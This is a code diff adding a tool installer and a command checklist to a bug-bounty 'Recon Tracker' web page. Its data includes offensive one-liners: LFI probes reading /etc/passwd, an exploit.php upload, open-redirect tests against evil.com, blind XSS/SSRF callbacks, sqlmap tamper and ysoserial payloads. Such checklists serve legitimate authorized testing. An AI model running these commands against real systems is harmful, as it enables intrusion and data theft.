@@ -398,6 +398,98 @@ header.top{
 }
 .modal .row{display:flex;gap:8px;justify-content:flex-end;}
 
+/* ---------- installer modal ---------- */
+.installer-modal{
+  max-width:720px;
+  width:94%;
+  max-height:82vh;
+  display:flex;
+  flex-direction:column;
+  padding:0;
+  overflow:hidden;
+}
+.installer-head{
+  padding:18px 22px;
+  border-bottom:3px solid var(--ink);
+  background:var(--yellow);
+  display:flex;
+  flex-wrap:wrap;
+  align-items:center;
+  justify-content:space-between;
+  gap:10px;
+}
+.installer-head h3{margin:0;font-size:18px;}
+.installer-actions{display:flex;gap:8px;flex-wrap:wrap;}
+.installer-body{
+  padding:18px 22px 24px;
+  overflow-y:auto;
+}
+.install-cat{margin-bottom:20px;}
+.install-cat-head{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:8px;
+  margin-bottom:4px;
+}
+.install-cat-title{
+  font-weight:700;
+  font-size:14px;
+  color:var(--ink);
+}
+.install-cat-note{
+  font-family:'Space Mono', monospace;
+  font-size:11px;
+  color:var(--paper-dim);
+  margin-bottom:8px;
+  font-style:italic;
+}
+.install-copy-cat{
+  background:var(--cyan);
+  border:2px solid var(--ink);
+  border-radius:999px;
+  padding:3px 10px;
+  font-family:'Space Mono', monospace;
+  font-weight:700;
+  font-size:10px;
+  cursor:pointer;
+}
+.install-copy-cat:hover{background:var(--pink);color:#fff;}
+.install-row{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  padding:6px 0;
+  border-bottom:2px dashed #d9cbb0;
+  flex-wrap:wrap;
+}
+.install-row:last-child{border-bottom:none;}
+.install-name{
+  flex:0 0 190px;
+  font-weight:600;
+  font-size:13px;
+  color:var(--ink);
+}
+.install-cmd{
+  flex:1 1 260px;
+  background:var(--code-bg);
+  color:var(--mint);
+  font-family:'Space Mono', monospace;
+  font-size:11.5px;
+  padding:7px 10px;
+  border-radius:8px;
+  border:2px solid var(--ink);
+  white-space:pre-wrap;
+  word-break:break-all;
+}
+.install-row .copy-btn{
+  position:static;
+  flex:0 0 auto;
+}
+@media (max-width:640px){
+  .install-name{flex:1 1 100%;}
+}
+
 footer.disclaimer{
   margin-top:34px;
   padding:14px 16px;
@@ -425,7 +517,22 @@ footer.disclaimer{
       <h1>Recon Tracker</h1>
       <div class="sub">Bug Bounty Methodology 2025 — based on <a href="https://github.com/amrelsagaei/Bug-Bounty-Hunting-Methodology-2025" target="_blank" rel="noopener">amrelsagaei's guide</a></div>
     </div>
+    <button class="btn primary" id="installToggleBtn">🧰 Install All Tools</button>
   </header>
+
+  <div class="modal-backdrop" id="installBackdrop">
+    <div class="modal installer-modal">
+      <div class="installer-head">
+        <h3>🧰 Tool Installer</h3>
+        <div class="installer-actions">
+          <button class="btn primary" id="copyAllInstallBtn">Copy all commands</button>
+          <button class="btn primary" id="downloadInstallBtn">⬇ Download install.sh</button>
+          <button class="btn" id="closeInstallBtn">Close</button>
+        </div>
+      </div>
+      <div class="installer-body" id="installerBody"></div>
+    </div>
+  </div>
 
   <div class="targetbar">
     <select id="targetSelect"></select>
@@ -465,6 +572,7 @@ footer.disclaimer{
 
 <script>
 const METHOD = [{"title": "1. Reconnaissance and Subdomain Enumeration", "subs": [{"title": "1.1 Passive Subdomain Enumeration", "items": [{"name": "Subfinder", "cmd": "subfinder -d target.com -silent -all -recursive -o subfinder_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Amass (Passive Mode)", "cmd": "amass enum -passive -d target.com -o amass_passive_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "CRT.sh Query", "cmd": "curl -s \"https://crt.sh/?q=%25.target.com&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | anew crtsh_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Github Dorking", "cmd": "github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Chaos (ProjectDiscovery dataset)", "cmd": "chaos -d target.com -silent -o chaos_subs.txt", "type": "passive", "new": true, "advanced": false, "chain": false}, {"name": "Assetfinder", "cmd": "assetfinder --subs-only target.com | anew assetfinder_subs.txt", "type": "passive", "new": true, "advanced": false, "chain": false}, {"name": "Results Combination", "cmd": "cat *_subs.txt | sort -u | anew all_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}]}, {"title": "1.2 Active Subdomain Enumeration", "items": [{"name": "MassDNS", "cmd": "massdns -r resolvers.txt -t A -o S -w massdns_results.txt wordlist.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "PureDNS (resolve + bruteforce, wildcard-safe)", "cmd": "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w active_subs.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Shuffledns", "cmd": "shuffledns -d target.com -list all_subs.txt -r resolvers.txt -o active_subs.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "DNSX Resolution", "cmd": "dnsx -l active_subs.txt -resp -o resolved_subs.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "SubBrute", "cmd": "python3 subbrute.py target.com -w wordlist.txt -o brute_force_subs.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "FFuF Subdomain", "cmd": "ffuf -u https://FUZZ.target.com -w wordlist.txt -t 50 -mc 200,403 -o ffuf_subs.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "1.3 Handling Specific (Non-Wildcard) Targets", "items": [{"name": "GAU", "cmd": "gau target.example.com | anew gau_results.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Waybackurls", "cmd": "waybackurls target.example.com | anew wayback_results.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Katana", "cmd": "katana -u target.example.com -silent -jc -o katana_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Hakrawler", "cmd": "echo \"https://target.example.com\" | hakrawler -depth 2 -plain -js -out hakrawler_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "Additional Advanced Techniques", "items": [{"name": "Reverse DNS", "cmd": "dnsx -ptr -l resolved_subs.txt -resp-only -o reverse_dns.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "ASN Enumeration", "cmd": "amass intel -asn <ASN_NUMBER> -o asn_results.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Asnmap (ProjectDiscovery ASN \u2192 CIDR)", "cmd": "asnmap -d target.com -silent -o asn_ranges.txt", "type": "passive", "new": true, "advanced": false, "chain": false}, {"name": "Cloud Asset Enumeration", "cmd": "cloud_enum -k target.com", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Naabu Port Scan", "cmd": "naabu -l resolved_subs.txt -top-ports 1000 -silent -o open_ports.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Tlsx Certificate SAN Harvesting", "cmd": "tlsx -l resolved_subs.txt -san -cn -silent -o tls_subs.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Results Validation", "cmd": "cat all_subs.txt | httpx -silent -title -o live_subdomains.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "1.4 Advanced: Permutation & Chained Discovery", "items": [{"name": "Gotator Permutation Wordlist", "cmd": "gotator -sub subs.txt -perm permutations_list.txt -depth 2 -numbers 3 -mindup -adv -md > permutations.txt", "type": null, "new": true, "advanced": true, "chain": false}, {"name": "AlterX + PureDNS Mutation Chain", "cmd": "subfinder -d target.com -silent | alterx -enrich | puredns resolve -r resolvers.txt | httpx -silent -o advanced_live.txt", "type": "active", "new": true, "advanced": true, "chain": true}, {"name": "DNS Zone Transfer Attempt", "cmd": "dig axfr @ns1.target.com target.com", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Full Mega-Recon One-Liner", "cmd": "subfinder -d target.com -silent | anew all.txt; assetfinder --subs-only target.com | anew all.txt; amass enum -passive -d target.com | anew all.txt; cat all.txt | dnsx -silent | httpx -silent -title -tech-detect -o live_full.txt", "type": "active", "new": true, "advanced": true, "chain": true}]}]}, {"title": "2. Discovery and Probing", "subs": [{"title": "2.1 HTTP Probing", "items": [{"name": "HTTPX Probing", "cmd": "httpx -l resolved_subs.txt -p 80,443,8080,8443 -silent -title -sc -ip -o live_websites.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "HTTPX Tech Detection + Screenshots", "cmd": "httpx -l live_websites.txt -title -tech-detect -status-code -follow-redirects -ss -srd screenshots/ -o httpx_tech.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Custom Filtering", "cmd": "cat live_websites.txt | grep -i \"login\\|admin\" | tee login_endpoints.txt", "type": null, "new": false, "advanced": false, "chain": false}]}, {"title": "2.2 JavaScript Analysis", "items": [{"name": "JS Extraction", "cmd": "cat live_websites.txt | waybackurls | grep \"\\.js\" | anew js_files.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "LinkFinder Analysis", "cmd": "python3 linkfinder.py -i js_files.txt -o js_endpoints.txt", "type": null, "new": false, "advanced": false, "chain": false}, {"name": "SecretFinder (live JS secret scan)", "cmd": "python3 SecretFinder.py -i https://target.com/app.js -o cli", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Sensitive Pattern Search", "cmd": "cat js_files.txt | gf aws-keys | tee aws_keys.txt\ncat js_files.txt | gf urls | tee sensitive_urls.txt", "type": null, "new": false, "advanced": false, "chain": false}, {"name": "API Key Validation", "cmd": "curl -X GET \"https://api.example.com/resource\" -H \"Authorization: Bearer <extracted_key>\"", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "2.3 Advanced Google Dorking", "items": [{"name": "Automated Dorking", "cmd": "python3 GitDorker.py -tf <github_token.txt> -q target.com -d dorks.txt -o git_dorks_output.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Admin/Login Files", "cmd": "site:*.example.com inurl:\"*admin | login\" | inurl:.php | .asp", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Config Files", "cmd": "site:*.example.com ext:env | ext:yaml | ext:ini", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Public Keys", "cmd": "site:*.example.com inurl:\"id_rsa.pub\" | inurl:\".pem\"", "type": "passive", "new": false, "advanced": false, "chain": false}]}, {"title": "2.4 URL Discovery", "items": [{"name": "Katana Crawling", "cmd": "katana -list live_websites.txt -jc -o katana_urls.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Cariddi (crawl + secrets + endpoints)", "cmd": "echo target.com | cariddi -s -ss -info -e -o cariddi_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Gospider", "cmd": "gospider -s \"https://target.com\" -d 2 -o gospider_output/", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Hakrawler", "cmd": "echo \"https://target.com\" | hakrawler -depth 3 -plain -out hakrawler_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "2.5 Archive Enumeration", "items": [{"name": "Archive URL Collection", "cmd": "gau --subs target.com | anew archived_urls.txt\nwaybackurls target.com | anew wayback_urls.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Uro (dedupe noisy archive URLs)", "cmd": "cat archived_urls.txt | uro | anew clean_urls.txt", "type": null, "new": true, "advanced": false, "chain": false}, {"name": "Parameter Extraction", "cmd": "cat archived_urls.txt | grep \"=\" | anew parameters.txt", "type": null, "new": false, "advanced": false, "chain": false}]}, {"title": "2.6 Advanced: JS Diffing & Chained Crawling", "items": [{"name": "JS Diff Monitoring (spot new endpoints over time)", "cmd": "katana -u https://target.com -jc -silent -o js_now.txt && diff js_prev.txt js_now.txt > js_diff.txt", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Crawl-to-Secrets Chain", "cmd": "katana -u https://target.com -jc -silent | grep \"\\.js\" | httpx -silent | xargs -I{} python3 SecretFinder.py -i {} -o cli", "type": "active", "new": true, "advanced": true, "chain": true}, {"name": "GraphQL Introspection Scan", "cmd": "graphql-cop -t https://target.com/graphql", "type": "active", "new": true, "advanced": true, "chain": false}]}]}, {"title": "3. Advanced Enumeration Techniques", "subs": [{"title": "3.1 Parameter Discovery", "items": [{"name": "Arjun Parameter Discovery", "cmd": "arjun -u \"https://target.example.com\" -m GET,POST --stable -o params.json", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "X8 Parameter Discovery (fast, header+body)", "cmd": "x8 -u https://target.com/page -w params_wordlist.txt -o x8_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "ParamSpider Web Parameters", "cmd": "python3 paramspider.py --domain target.com --exclude woff,css,js --output paramspider_output.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "FFuF Parameter Bruteforce", "cmd": "ffuf -u https://target.com/page.php?FUZZ=test -w /usr/share/wordlists/params.txt -o parameter_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "3.2 Cloud Asset Enumeration", "items": [{"name": "Cloud Bucket Enumeration", "cmd": "cloud_enum -k target.com -b buckets.txt -o cloud_enum_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "S3 Bucket Access Test", "cmd": "aws s3 ls s3://<bucket_name> --no-sign-request", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "S3 Bucket Content Dump", "cmd": "python3 AWSBucketDump.py -b target-bucket -o dumped_data/", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "3.3 Content Discovery", "items": [{"name": "Feroxbuster", "cmd": "feroxbuster -u https://target.com -w /usr/share/wordlists/common.txt -r -t 20 -o recursive_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Dirsearch", "cmd": "dirsearch -u https://target.com -w /usr/share/wordlists/content_discovery.txt -e php,html,js,json -x 404 -o dirsearch_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "FFuF Recursive", "cmd": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/content_discovery.txt -mc 200,403 -recursion -recursion-depth 3 -o ffuf_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "FFuF Virtual Host Discovery", "cmd": "ffuf -u https://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt -mc 200 -o vhost_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}]}, {"title": "3.4 API Enumeration", "items": [{"name": "Kiterunner", "cmd": "kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite -o api_routes.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Nuclei API Exposure Templates", "cmd": "nuclei -l live_websites.txt -t exposures/apis/ -o api_exposures.txt", "type": "active", "new": true, "advanced": false, "chain": false}]}, {"title": "3.5 ASN Mapping", "items": [{"name": "ASN Lookup", "cmd": "amass intel -asn <ASN_Number> -o asn_ips.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Shodan Enumeration", "cmd": "shodan search \"net:<ip_range>\" --fields ip_str,port --limit 100", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Censys Asset Search", "cmd": "censys search \"autonomous_system.asn:<ASN_Number>\" -o censys_assets.txt", "type": "passive", "new": false, "advanced": false, "chain": false}]}, {"title": "3.6 Advanced: GraphQL, JWT & Deep Parameter Chains", "items": [{"name": "JWT Tool Attack Suite", "cmd": "python3 jwt_tool.py <JWT> -M at -u https://target.com/api", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Clairvoyance (schema recovery w/ introspection off)", "cmd": "clairvoyance -o schema.json https://target.com/graphql", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Param-to-Reflected-XSS Chain", "cmd": "cat parameters.txt | gf xss | Gxss -p test | kxss", "type": "active", "new": true, "advanced": true, "chain": true}]}]}, {"title": "4. Vulnerability Testing", "subs": [{"title": "4.1 High-Priority Vulnerabilities", "items": [{"name": "\ud83d\udc1eCSRF Testing", "cmd": "cat live_websites.txt | gf csrf | tee csrf_endpoints.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eLFI Testing", "cmd": "cat live_websites.txt | gf lfi | qsreplace \"/etc/passwd\" | xargs -I@ curl -s @ | grep \"root:x:\" > lfi_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eRCE Testing", "cmd": "curl -X POST -F \"file=@exploit.php\" https://target.com/upload", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eSQLi Testing", "cmd": "ghauri -u \"https://target.com?id=1\" --dbs --batch", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eSensitive Data Search", "cmd": "cat js_files.txt | grep -Ei \"key|token|auth|password\" > sensitive_data.txt", "type": null, "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eOpen Redirect Test", "cmd": "cat urls.txt | grep \"=http\" | qsreplace \"https://evil.com\" | xargs -I@ curl -I -s @ | grep \"evil.com\"", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "4.2 Automated & High-Signal Scans (Latest Tools)", "items": [{"name": "Nuclei Full Scan (critical/high templates)", "cmd": "nuclei -l live_websites.txt -t nuclei-templates/ -severity critical,high -rl 50 -o nuclei_findings.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Nuclei CVE Templates", "cmd": "nuclei -l live_websites.txt -t cves/ -o nuclei_cve_findings.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Subdomain Takeover Check", "cmd": "nuclei -l resolved_subs.txt -t takeovers/ -o takeover_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Dalfox XSS Scan", "cmd": "dalfox file urls.txt --waf-bypass -o dalfox_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Corsy CORS Misconfiguration Scan", "cmd": "python3 corsy.py -i live_websites.txt -o corsy_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "HTTP Request Smuggling (Smuggler)", "cmd": "python3 smuggler.py -u https://target.com -o smuggler_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Blind SSRF via Interactsh", "cmd": "cat urls.txt | qsreplace \"http://YOUR-UNIQUE-ID.oast.site\" | httpx -silent -o ssrf_candidates.txt", "type": "active", "new": true, "advanced": false, "chain": false}]}, {"title": "4.3 Advanced: Exploit Chains", "items": [{"name": "SSTI Detection (Tplmap)", "cmd": "tplmap -u 'https://target.com/page?name=John'", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "OS Command Injection (Commix)", "cmd": "commix --url=\"https://target.com/page?input=test\" --batch", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Advanced SQLi w/ Tamper Scripts", "cmd": "sqlmap -u \"https://target.com?id=1\" --dbs --batch --tamper=space2comment,between --risk=3 --level=5", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Prototype Pollution Scan", "cmd": "ppmap -f requests.txt", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Race Condition Testing", "cmd": "python3 race_the_web.py config.json", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Blind XSS Full Chain", "cmd": "cat urls.txt | dalfox pipe --blind https://YOUR-ID.xss.ht", "type": "active", "new": true, "advanced": true, "chain": true}, {"name": "Java Deserialization Payload (ysoserial, authorized targets only)", "cmd": "java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin", "type": "active", "new": true, "advanced": true, "chain": false}]}]}, {"title": "5. The \"Two-Eye\" Approach \ud83d\udc40", "subs": [{"title": "Actionable Steps", "items": [{"name": "First Eye \u2014 test every gathered subdomain/endpoint/parameter for common vulns", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Second Eye \u2014 hunt for interesting findings (exposed creds, forgotten subdomains, admin panels)", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Build a POC for any confirmed vulnerability and test its real impact", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "No vuln found? Pivot to deeper testing on unique subdomains/endpoints", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}]}]}, {"title": "6. Proof of Concept (POC) Creation", "subs": [{"title": "Capture Evidence", "items": [{"name": "Video POC \u2014 screen-record the exploit end-to-end (OBS Studio)", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Screenshot POC \u2014 capture clear before/after screenshots (Greenshot)", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}]}]}, {"title": "7. Reporting", "subs": [{"title": "Write the Report", "items": [{"name": "Overview \u2014 one-line summary of the vulnerability", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Description \u2014 technical explanation of the issue", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Steps to Reproduce \u2014 numbered, reproducible steps", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Impact \u2014 what an attacker can actually do with it", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Proof of Concept \u2014 attach video/screenshots", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Recommendations \u2014 concrete remediation advice", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "References \u2014 CWE/CVE/OWASP links", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Keep it clear, concise, and reproducible by anyone", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}]}]}];
+const INSTALL_TOOLS = [{"category": "0. Prerequisites", "note": "Run this once before anything else.", "tools": [{"name": "Base system deps", "cmd": "sudo apt update && sudo apt install -y git curl wget jq dnsutils build-essential python3-pip pipx golang-go cargo default-jre"}, {"name": "Go PATH (add to ~/.bashrc or ~/.zshrc)", "cmd": "export PATH=$PATH:$(go env GOPATH)/bin"}]}, {"category": "1. Go Tools (ProjectDiscovery + community)", "tools": [{"name": "subfinder", "cmd": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"}, {"name": "httpx", "cmd": "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"}, {"name": "dnsx", "cmd": "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest"}, {"name": "naabu", "cmd": "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"}, {"name": "katana", "cmd": "go install github.com/projectdiscovery/katana/cmd/katana@latest"}, {"name": "nuclei", "cmd": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && nuclei -update-templates"}, {"name": "chaos-client", "cmd": "go install github.com/projectdiscovery/chaos-client/cmd/chaos@latest"}, {"name": "asnmap", "cmd": "go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest"}, {"name": "tlsx", "cmd": "go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest"}, {"name": "alterx", "cmd": "go install github.com/projectdiscovery/alterx/cmd/alterx@latest"}, {"name": "shuffledns", "cmd": "go install github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"}, {"name": "interactsh-client", "cmd": "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"}, {"name": "puredns", "cmd": "go install github.com/d3mondev/puredns/v2@latest"}, {"name": "assetfinder", "cmd": "go install github.com/tomnomnom/assetfinder@latest"}, {"name": "waybackurls", "cmd": "go install github.com/tomnomnom/waybackurls@latest"}, {"name": "anew", "cmd": "go install github.com/tomnomnom/anew@latest"}, {"name": "qsreplace", "cmd": "go install github.com/tomnomnom/qsreplace@latest"}, {"name": "gf (+ patterns)", "cmd": "go install github.com/tomnomnom/gf@latest && git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf"}, {"name": "gau", "cmd": "go install github.com/lc/gau/v2/cmd/gau@latest"}, {"name": "hakrawler", "cmd": "go install github.com/hakluke/hakrawler@latest"}, {"name": "gospider", "cmd": "go install github.com/jaeles-project/gospider@latest"}, {"name": "ffuf", "cmd": "go install github.com/ffuf/ffuf/v2@latest"}, {"name": "dalfox", "cmd": "go install github.com/hahwul/dalfox/v2@latest"}, {"name": "cariddi", "cmd": "go install github.com/edoardottt/cariddi/cmd/cariddi@latest"}, {"name": "github-subdomains", "cmd": "go install github.com/gwen001/github-subdomains@latest"}, {"name": "gotator", "cmd": "go install github.com/Josue87/gotator@latest"}, {"name": "Gxss", "cmd": "go install github.com/KathanP19/Gxss@latest"}, {"name": "kxss", "cmd": "go install github.com/Emoe/kxss@latest"}, {"name": "ppmap", "cmd": "go install github.com/dwisiswant0/ppmap@latest"}, {"name": "race-the-web", "cmd": "go install github.com/insp3ctre/race-the-web@latest"}]}, {"category": "2. Python Tools (pip / venv)", "tools": [{"name": "uro", "cmd": "pipx install uro"}, {"name": "arjun", "cmd": "pipx install arjun"}, {"name": "shodan CLI", "cmd": "pip3 install shodan"}, {"name": "censys CLI", "cmd": "pip3 install censys"}, {"name": "clairvoyance", "cmd": "pip3 install clairvoyance"}, {"name": "ghauri", "cmd": "git clone https://github.com/r0oth3x49/ghauri.git && cd ghauri && pip3 install -r requirements.txt"}, {"name": "ParamSpider", "cmd": "git clone https://github.com/devanshbatham/ParamSpider.git && cd ParamSpider && pip3 install -r requirements.txt"}, {"name": "LinkFinder", "cmd": "git clone https://github.com/GerbenJavado/LinkFinder.git && cd LinkFinder && pip3 install -r requirements.txt"}, {"name": "SecretFinder", "cmd": "git clone https://github.com/m4ll0k/SecretFinder.git && cd SecretFinder && pip3 install -r requirements.txt"}, {"name": "GitDorker", "cmd": "git clone https://github.com/obheda12/GitDorker.git && cd GitDorker && pip3 install -r requirements.txt"}, {"name": "cloud_enum", "cmd": "git clone https://github.com/initstring/cloud_enum.git && cd cloud_enum && pip3 install -r requirements.txt"}, {"name": "AWSBucketDump", "cmd": "git clone https://github.com/jordanpotti/AWSBucketDump.git && cd AWSBucketDump && pip3 install -r requirements.txt"}, {"name": "Corsy", "cmd": "git clone https://github.com/s0md3v/Corsy.git && cd Corsy && pip3 install -r requirements.txt"}, {"name": "graphql-cop", "cmd": "git clone https://github.com/dolevf/graphql-cop.git && cd graphql-cop && pip3 install -r requirements.txt"}, {"name": "jwt_tool", "cmd": "git clone https://github.com/ticarpi/jwt_tool.git && cd jwt_tool && pip3 install -r requirements.txt"}, {"name": "smuggler", "cmd": "git clone https://github.com/defparam/smuggler.git"}, {"name": "dirsearch", "cmd": "git clone https://github.com/maurosoria/dirsearch.git && cd dirsearch && pip3 install -r requirements.txt"}, {"name": "aws-cli", "cmd": "pip3 install awscli"}]}, {"category": "3. Rust Tools (cargo)", "tools": [{"name": "feroxbuster", "cmd": "cargo install feroxbuster"}, {"name": "x8", "cmd": "cargo install x8"}]}, {"category": "4. Build-from-source / Manual", "tools": [{"name": "massdns", "cmd": "git clone https://github.com/blechschmidt/massdns.git && cd massdns && make && sudo make install"}, {"name": "kiterunner", "cmd": "git clone https://github.com/assetnote/kiterunner.git && cd kiterunner && make build"}, {"name": "ysoserial (jar, authorized deserialization testing only)", "cmd": "wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar"}]}, {"category": "5. System Package Manager", "tools": [{"name": "sqlmap", "cmd": "sudo apt install -y sqlmap"}, {"name": "commix", "cmd": "sudo apt install -y commix"}, {"name": "amass", "cmd": "sudo apt install -y amass"}]}, {"category": "6. Manual download (no package manager)", "tools": [{"name": "tplmap (legacy Python2 tool)", "cmd": "git clone https://github.com/epinna/tplmap.git"}]}];
 
 let state = {
   targets: [],      // list of target name strings
@@ -793,6 +901,96 @@ function exportScript(){
 }
 
 document.getElementById('exportScriptBtn').addEventListener('click', exportScript);
+
+// ---- Tool Installer ----
+function renderInstaller(){
+  const body = document.getElementById('installerBody');
+  let html = '';
+  INSTALL_TOOLS.forEach((cat, ci)=>{
+    html += `<div class="install-cat">
+      <div class="install-cat-head">
+        <span class="install-cat-title">${escapeHtml(cat.category)}</span>
+        <button class="install-copy-cat" onclick="copyCategory(event, ${ci})">copy category</button>
+      </div>
+      ${cat.note ? `<div class="install-cat-note">${escapeHtml(cat.note)}</div>` : ''}`;
+    cat.tools.forEach((t, ti)=>{
+      html += `<div class="install-row" data-ci="${ci}" data-ti="${ti}">
+        <div class="install-name">${escapeHtml(t.name)}</div>
+        <div class="install-cmd">${escapeHtml(t.cmd)}</div>
+        <button class="copy-btn" onclick="copyInstallCmd(event, ${ci}, ${ti})">copy</button>
+      </div>`;
+    });
+    html += `</div>`;
+  });
+  body.innerHTML = html;
+}
+
+window.copyInstallCmd = function(e, ci, ti){
+  const text = INSTALL_TOOLS[ci].tools[ti].cmd;
+  navigator.clipboard.writeText(text).then(()=>{
+    const btn = e.target;
+    const old = btn.innerText;
+    btn.innerText = 'copied';
+    setTimeout(()=>{btn.innerText = old;}, 1200);
+  });
+}
+
+window.copyCategory = function(e, ci){
+  const cat = INSTALL_TOOLS[ci];
+  const text = cat.tools.map(t => `# ${t.name}\n${t.cmd}`).join('\n\n');
+  navigator.clipboard.writeText(text).then(()=>{
+    const btn = e.target;
+    const old = btn.innerText;
+    btn.innerText = 'copied!';
+    setTimeout(()=>{btn.innerText = old;}, 1200);
+  });
+}
+
+function buildFullInstallScript(){
+  const lines = [
+    '#!/usr/bin/env bash',
+    '# Full tool installer — Recon Tracker',
+    '# Review before running. Installs Go/Python/Rust/system tools used across the checklist.',
+    ''
+  ];
+  INSTALL_TOOLS.forEach(cat=>{
+    lines.push(`# ============ ${cat.category} ============`);
+    if(cat.note) lines.push(`# ${cat.note}`);
+    cat.tools.forEach(t=>{
+      lines.push(`# ${t.name}`);
+      lines.push(t.cmd);
+      lines.push('');
+    });
+  });
+  return lines.join('\n');
+}
+
+document.getElementById('installToggleBtn').addEventListener('click', ()=>{
+  renderInstaller();
+  document.getElementById('installBackdrop').classList.add('open');
+});
